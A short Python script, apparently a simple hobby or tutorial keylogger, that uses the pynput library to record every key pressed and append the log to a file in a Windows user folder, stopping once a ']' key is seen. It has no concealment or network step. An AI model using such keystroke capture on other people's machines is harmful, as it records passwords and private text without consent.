from pynput import keyboard

typed_chars = ''
def on_press(key):
    global typed_chars
    typed_chars += str(key) + ' '
    if typed_chars[-3] == ']':
        with open('C:/Users/<type_your_pc_name>/output', 'a') as f:
            f.write(typed_chars)
        exit()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
